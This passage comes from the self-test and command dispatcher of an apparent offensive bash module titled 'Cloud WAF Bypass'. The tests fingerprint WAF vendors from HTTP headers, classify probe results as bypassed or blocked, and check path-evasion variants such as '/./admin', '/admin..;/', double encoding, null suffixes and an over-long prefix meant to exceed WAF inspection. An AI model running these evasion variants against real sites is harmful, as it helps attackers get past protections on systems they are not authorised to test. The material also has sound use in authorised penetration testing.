    printf 'HTTP/1.1 200 OK\r\nVia: 1.1 google\r\nX-Cloud-Trace-Context: a/b;o=1\r\n\r\n' > "$h"
    chk vendor-gcp "$(wb_vendor "$h")" "gcp"
    chk cloud-gcp  "$(wb_cloud gcp)" "gcp"

    printf 'HTTP/1.1 200 OK\r\nServer: AkamaiGHost\r\n\r\n' > "$h"
    chk vendor-akamai "$(wb_vendor "$h")" "akamai"
    printf 'HTTP/1.1 200 OK\r\nX-Served-By: cache-fra19123\r\nVia: 1.1 varnish\r\n\r\n' > "$h"
    chk vendor-fastly "$(wb_vendor "$h")" "fastly"
    printf 'HTTP/1.1 200 OK\r\nX-Iinfo: 9-12345-12346 NNNN CT(0 0 0)\r\n\r\n' > "$h"
    chk vendor-imperva "$(wb_vendor "$h")" "imperva"
    printf 'HTTP/1.1 200 OK\r\nServer: BigIP\r\n\r\n' > "$h"
    chk vendor-f5 "$(wb_vendor "$h")" "f5"
    printf 'HTTP/1.1 200 OK\r\nServer: FortiWeb\r\n\r\n' > "$h"
    chk vendor-fortiweb "$(wb_vendor "$h")" "fortiweb"
    printf 'HTTP/1.1 200 OK\r\nSet-Cookie: HWWAFSESID=abc123; path=/\r\n\r\n' > "$h"
    chk vendor-huawei "$(wb_vendor "$h")" "huawei-waf"
    chk cloud-huawei "$(wb_cloud huawei-waf)" "alicloud"
    printf 'HTTP/1.1 200 OK\r\nSet-Cookie: acw_tc=0a1b2c; path=/\r\n\r\n' > "$h"
    chk vendor-alibaba "$(wb_vendor "$h")" "alibaba-waf"
    printf 'HTTP/1.1 200 OK\r\nX-NWS-Log-Uuid: abc-123\r\n\r\n' > "$h"
    chk vendor-tencent "$(wb_vendor "$h")" "tencent-waf"
    printf 'HTTP/1.1 200 OK\r\nServer: Sucuri/Cloudproxy\r\n\r\n' > "$h"
    chk vendor-sucuri "$(wb_vendor "$h")" "sucuri"
    printf 'HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\n\r\n' > "$h"
    chk vendor-none "$(wb_vendor "$h")" "none"
    chk vendor-empty "$(wb_vendor "$CS_SCRATCH/wb-nope.hdr")" "none"

    # order matters: a Cloudflare edge that parks behind Akamai must be named
    # once, and the first signature in the table is the one that answers
    printf 'HTTP/1.1 200 OK\r\nServer: cloudflare\r\nServer: AkamaiGHost\r\n\r\n' > "$h"
    chk vendor-order "$(wb_vendor "$h")" "akamai"

    # ── the classifier: the whole module rests on this ──
    # control 200/aaaa, edge refuses 403/bbbb
    chk cls-bypass   "$(wb_classify 200 aaaa 403 bbbb 200 aaaa)" "bypass"
    chk cls-blocked  "$(wb_classify 200 aaaa 403 bbbb 403 bbbb)" "blocked"
    chk cls-reached  "$(wb_classify 200 aaaa 403 bbbb 200 cccc)" "reached-origin"
    chk cls-other    "$(wb_classify 200 aaaa 403 bbbb 500 dddd)" "reached-origin"
    chk cls-dead     "$(wb_classify 200 aaaa 403 bbbb 000 '')" "ambiguous"
    # no edge at all: refuse to invent a bypass
    chk cls-noedge   "$(wb_classify 200 aaaa 200 aaaa 200 aaaa)" "no-edge"
    chk cls-noedge2  "$(wb_classify 200 aaaa '' '' 403 bbbb)" "no-edge"
    # a variant that answers exactly like the control is the origin talking
    chk cls-origin-same "$(wb_classify 404 zzzz 403 bbbb 404 zzzz)" "bypass"

    # ── the variant matrix ──
    local vl; vl="$(wb_variants /admin | wc -l | tr -d ' ')"
    chk var-count "$( (( vl >= 20 )) && echo many || echo few )" "many"
    chk var-unique "$(wb_variants /admin | cut -f2 | sort | uniq -d | wc -l | tr -d ' ')" "0"
    chk var-first "$(wb_variants /admin | head -1 | awk -F'\x1f' '{print $2}')" "/admin"
    # the exact path must appear once, as the control variant
    chk var-exact-once "$(wb_variants /admin | awk -F'\x1f' '$2=="/admin"' | wc -l | tr -d ' ')" "1"
    # these are the forms that actually evade a normalising WAF
    local labels; labels="$(wb_variants /admin | cut -f1 | tr '\n' ' ')"
    chk var-has-dot     "$( [[ "$labels" == *dot-prefix* ]] && echo yes || echo no )" "yes"
    chk var-has-dotdot  "$( [[ "$labels" == *dotdot-inner* ]] && echo yes || echo no )" "yes"
    chk var-has-enc     "$( [[ "$labels" == *enc-slash* ]] && echo yes || echo no )" "yes"
    chk var-has-semi    "$( [[ "$labels" == *semi-dots* ]] && echo yes || echo no )" "yes"
    chk var-has-dblenc  "$( [[ "$labels" == *double-enc-dot* ]] && echo yes || echo no )" "yes"
    chk var-has-null    "$( [[ "$labels" == *null-suffix* ]] && echo yes || echo no )" "yes"
    chk var-has-long    "$( [[ "$labels" == *long-prefix* ]] && echo yes || echo no )" "yes"
    chk var-path-norm   "$(wb_variants admin | head -1 | awk -F'\x1f' '{print $2}')" "/admin"
    # the dot forms must survive as literal text, not be collapsed here
    chk var-dot-literal "$(wb_variants /admin | awk -F'\x1f' '$1=="dot-prefix"{print $2}')" "/./admin"
    chk var-dotdot-lit  "$(wb_variants /admin | awk -F'\x1f' '$1=="dot-inner"{print $2}')" "/a/../admin"
    chk var-semi-lit    "$(wb_variants /admin | awk -F'\x1f' '$1=="semi-dots"{print $2}')" "/admin..;/"
    # a long variant has to exceed the window a WAF inspects
    chk var-long      "$(wb_variants /admin | awk -F'\x1f' '$1=="long-prefix"{print length($2)}')" "$(( 3800 + 7 ))"
    chk var-upper     "$(wb_variants /admin | awk -F'\x1f' '$1=="upper-case"{print $2}')" "/ADMIN"
    chk var-mixed     "$(wb_variants /Admin | awk -F'\x1f' '$1=="mixed-case"{print $2}')" "/aDmIn"

    # ── the block-signature decision ──
    # Probes must be distinct paths: the whole detector rests on two
    # different paths producing one body.
    chk probe-count  "$(wb_probe_paths | wc -l | tr -d ' ')" "3"
    chk probe-unique "$(wb_probe_paths | sort -u | wc -l | tr -d ' ')" "3"
    chk probe-dotenv "$(wb_probe_paths | grep -cF '/.env')" "1"
    # an edge refusing the caller is not an edge refusing the path
    chk refuse-403 "$(wb_edge_refuses_all 403 && echo yes || echo no)" "yes"
    chk refuse-429 "$(wb_edge_refuses_all 429 && echo yes || echo no)" "yes"
    chk refuse-404 "$(wb_edge_refuses_all 404 && echo yes || echo no)" "no"
    chk refuse-200 "$(wb_edge_refuses_all 200 && echo yes || echo no)" "no"

    # ── shape contracts ──
    chk status-fields "$(wb_cmd_status_tsv | awk -F'\t' '{print NF}')" "5"
    chk status-module "$(wb_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(wb_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(wb_cmd_help | head -1 | grep -ci 'Cloud WAF Bypass')" "1"
    chk help-mentions "$(wb_cmd_help | grep -c 'ambiguous')" "1"
    chk vendors-many  "$( (( $(wb_cmd_vendors | wc -l) >= 18 )) && echo many || echo few )" "many"
    chk vendors-aws   "$(wb_cmd_vendors | grep -c 'aws-waf')" "1"
    chk vendors-cn    "$(wb_cmd_vendors | grep -c 'huawei-waf')" "1"
    chk variants-shape "$(wb_cmd_variants /admin | head -1 | awk -F'\t' '{print $1}')" "VARIANT"

    CS_LOOT="$real_loot"
    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --detect)   shift; wb_cmd_detect "$@";;
    --bypass)   shift; wb_cmd_bypass "$@";;
    --headers)  shift; wb_cmd_headers "$@";;
    --rate)     shift; wb_cmd_rate "$@";;
    --origin)   shift; wb_cmd_origin "$@";;
    --variants) shift; wb_cmd_variants "$@";;
    --vendors)  wb_cmd_vendors;;
    --status-tsv|--status) wb_cmd_status_tsv;;
    --menu)     wb_cmd_menu;;
    --selftest) wb_selftest;;
    *)          wb_cmd_help;;
esac
